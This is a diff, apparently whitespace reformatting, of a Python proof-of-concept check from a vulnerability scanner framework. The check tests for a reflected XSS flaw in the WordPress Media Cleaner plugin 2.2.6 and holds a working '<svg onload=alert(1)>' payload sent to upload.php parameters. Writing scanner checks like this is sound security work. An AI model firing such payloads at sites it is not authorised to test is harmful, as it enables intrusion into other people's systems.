@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'WordPress_0013' # 平台漏洞编号，留空
+    vuln_id = 'WordPress_0013'  # 平台漏洞编号，留空
     name = 'WordPress Media Cleaner Plugin 2.2.6 XSS'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.XSS # 漏洞类型
+    type = VulnType.XSS  # 漏洞类型
     disclosure_date = '2015-03-02'  # 漏洞公布时间
     desc = '''
         /wordpress/wp-admin/upload.php?s=test&page=wp-media-cleaner&view={XSS}&paged={XSS}&s={XSS}
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'WordPress'  # 漏洞应用名称
     product_version = 'WordPress Media Cleaner Plugin 2.2.6 '  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '1fe76b15-dd37-43a8-829c-6b1e9e28f790'
@@ -32,7 +34,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/wordpress/wp-admin/upload.php?s=test%page=wp-media-cleaner&view="><svg onload=alert(1)>'
             payload += '&paged="><svg onload=alert(1)>&s="><svg onload=alert(1)>'
             verify_url = self.target + payload
@@ -40,14 +42,15 @@ class Poc(ABPoc):
             req = requests.get(verify_url)
 
             if '<svg onload=alert(1)>' in req.text:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
